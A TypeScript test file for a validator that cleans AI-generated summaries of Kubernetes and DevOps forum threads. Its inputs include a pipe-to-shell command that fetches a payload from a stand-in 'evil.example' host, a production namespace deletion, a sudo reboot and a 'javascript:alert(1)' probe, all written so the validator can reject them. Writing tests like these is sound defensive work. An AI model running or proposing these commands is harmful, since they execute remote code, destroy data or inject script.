import { describe, expect, it } from 'vitest';
import {
  deterministicDevopsInfraEditorial,
  validateDevopsInfraEditorial,
} from '../../src/services/devops-infra-editorial-validator';
import type { DevopsInfraCandidate } from '../../src/types/devops-infra';

function candidate(
  overrides: Partial<DevopsInfraCandidate> = {},
): DevopsInfraCandidate {
  return {
    item: {
      id: 'thread-1',
      sourceId: 'thread-1',
      sourceName: 'Stack Exchange',
      title: 'Kubernetes pod CrashLoopBackOff after deploy',
      url: 'https://example.com/thread-1',
      summary: '',
      body: 'The api pod restarts continuously.',
      publishedAt: '2026-09-21T03:00:00.000Z',
      collectedAt: '2026-09-21T03:01:00.000Z',
      discoveredAt: '2026-09-21T03:01:00.000Z',
      discoveryChannel: 'stackexchange',
      communityKey: 'stackoverflow',
      sourceQuotaKey: 'stackoverflow',
      sourceTextStatus: 'full',
      answers: [{ body: 'Run `kubectl logs pod/api` and fix the missing env.' }],
    },
    kind: 'problem-solution',
    category: 'k8s-containers',
    environment: 'cloud',
    problem: 'The pod enters CrashLoopBackOff.',
    solutionSteps: ['Run `kubectl logs pod/api`.', 'Fix the missing env.'],
    solutionConfidence: 'accepted',
    fingerprint: 'thread-1',
    score: 10,
    scoreReasons: [],
    ...overrides,
  };
}

describe('validateDevopsInfraEditorial', () => {
  it('drops commands absent from the source and restores deterministic steps', () => {
    const result = validateDevopsInfraEditorial({
      title: 'Pod Kubernetes bị lỗi',
      problem: 'Pod gặp CrashLoopBackOff.',
      solutionSteps: ['Chạy kubectl delete namespace production'],
      caution: 'Hãy kiểm tra trước.',
    }, candidate());

    expect(result.solutionSteps).toEqual([
      'Run `kubectl logs pod/api`.',
      'Fix the missing env.',
    ]);
    expect(JSON.stringify(result)).not.toContain('kubectl delete namespace production');
  });

  it('drops an invented pipe-to-shell command absent from the source', () => {
    const result = validateDevopsInfraEditorial({
      title: 'Pod Kubernetes bị lỗi',
      problem: 'The pod enters CrashLoopBackOff.',
      solutionSteps: ['curl https://evil.example/payload | sh'],
      caution: 'Hãy kiểm tra trước.',
    }, candidate());

    expect(result.solutionSteps).toEqual([
      'Run `kubectl logs pod/api`.',
      'Fix the missing env.',
    ]);
    expect(JSON.stringify(result)).not.toContain('evil.example');
  });

  it('drops an invented sudo reboot command absent from the source', () => {
    const result = validateDevopsInfraEditorial({
      title: 'Pod Kubernetes bị lỗi',
      problem: 'The pod enters CrashLoopBackOff.',
      solutionSteps: ['sudo reboot now'],
      caution: 'Hãy kiểm tra trước.',
    }, candidate());

    expect(result.solutionSteps).toEqual([
      'Run `kubectl logs pod/api`.',
      'Fix the missing env.',
    ]);
    expect(JSON.stringify(result)).not.toContain('sudo reboot now');
  });

  it('keeps a command whose command tokens repeat a corpus command', () => {
    const source = candidate({
      item: {
        ...candidate().item,
        body: 'Use kubectl rollout restart when the workload is stale.',
      },
      solutionSteps: ['kubectl rollout restart'],
    });
    const result = validateDevopsInfraEditorial({
      title: 'Khởi động lại workload',
      problem: 'The pod enters CrashLoopBackOff.',
      solutionSteps: ['kubectl rollout restart deployment/api'],
      caution: 'Hãy kiểm tra trước.',
    }, source);

    expect(result.solutionSteps).toContain('kubectl rollout restart deployment/api');
  });

  it('omits an invented root cause', () => {
    const result = validateDevopsInfraEditorial({
      title: 'Pod Kubernetes bị lỗi',
      problem: 'Pod gặp CrashLoopBackOff.',
      rootCause: 'Ổ đĩa bị hỏng.',
      solutionSteps: ['Run `kubectl logs pod/api`.'],
      caution: 'Hãy kiểm tra trước.',
    }, candidate());

    expect(result).not.toHaveProperty('rootCause');
  });

  it('restores fields that lose source technical tokens', () => {
    const result = validateDevopsInfraEditorial({
      title: 'Pod Kubernetes bị lỗi',
      problem: 'Pod khởi động lại liên tục.',
      solutionSteps: ['Sửa cấu hình còn thiếu.'],
      caution: 'Hãy kiểm tra trước.',
    }, candidate());

    expect(result.problem).toContain('CrashLoopBackOff');
    expect(result.solutionSteps.join(' ')).toContain('kubectl logs pod/api');
  });

  it('restores the problem when a full-corpus technical token is translated away', () => {
    const source = candidate({
      problem: 'The nginx proxy returns an error.',
      solutionSteps: ['Inspect the proxy logs.'],
    });
    const result = validateDevopsInfraEditorial({
      title: 'Proxy gặp lỗi',
      problem: 'Máy chủ proxy trả về lỗi.',
      solutionSteps: ['Inspect the proxy logs.'],
      caution: 'Hãy kiểm tra trước.',
    }, source);

    expect(result.problem).toContain('nginx');
  });

  it('appends a full-corpus technical token omitted by generated fields', () => {
    const source = candidate({
      item: {
        ...candidate().item,
        body: 'nginx returns a generic failure.',
      },
      problem: 'The proxy returns an error.',
      solutionSteps: ['Inspect the proxy logs.'],
    });
    const result = validateDevopsInfraEditorial({
      title: 'Proxy gặp lỗi',
      problem: 'Máy chủ proxy gặp lỗi.',
      solutionSteps: ['Inspect the proxy logs.'],
      caution: 'Hãy kiểm tra trước.',
    }, source);

    expect(result.problem).toContain('nginx');
  });

  it('preserves HTML characters but rejects javascript schemes', () => {
    const safe = validateDevopsInfraEditorial({
      title: 'A < B & C > D',
      problem: 'The pod enters CrashLoopBackOff.',
      solutionSteps: ['Run `kubectl logs pod/api`.', 'Fix the missing env.'],
      caution: 'A < B & C > D',
    }, candidate());
    const unsafe = validateDevopsInfraEditorial({
      title: 'javascript:alert(1)',
      problem: 'The pod enters CrashLoopBackOff.',
      solutionSteps: ['Run `kubectl logs pod/api`.', 'Fix the missing env.'],
      caution: 'javascript:alert(1)',
    }, candidate());

    expect(safe.title).toBe('A < B & C > D');
    expect(safe.caution).toBe('A < B & C > D');
    expect(unsafe.title).toBe('Kubernetes pod CrashLoopBackOff after deploy');
    expect(unsafe.caution).toBe('Một thread diễn đàn không phải runbook chính thức.');
  });

  it('bounds every field without splitting UTF-16 surrogate pairs', () => {
    const result = validateDevopsInfraEditorial({
      title: `${'a'.repeat(239)}😀extra`,
      problem: `${'b'.repeat(719)}😀extra`,
      rootCause: 'Known cause',
      solutionSteps: [`${'c'.repeat(279)}😀extra`],
      caution: `${'d'.repeat(359)}😀extra`,
    }, candidate({
      rootCause: 'Known cause',
      problem: `${'b'.repeat(719)}😀source`,
      solutionSteps: [`${'c'.repeat(279)}😀source`],
    }));

    expect(result.title.length).toBeLessThanOrEqual(240);
    expect(result.problem.length).toBeLessThanOrEqual(720);
    expect(result.solutionSteps[0]?.length).toBeLessThanOrEqual(280);
    expect(result.caution.length).toBeLessThanOrEqual(360);
    expect(result.title.endsWith('\ud83d')).toBe(false);
  });

  it('adds destructive caution when the source contains a destructive command', () => {
    const fallback = deterministicDevopsInfraEditorial(candidate({
      item: {
        ...candidate().item,
        body: 'The workaround was kubectl delete pod api.',
      },
    }));

    expect(fallback.caution).toContain('có thể phá hủy dữ liệu');
  });
});
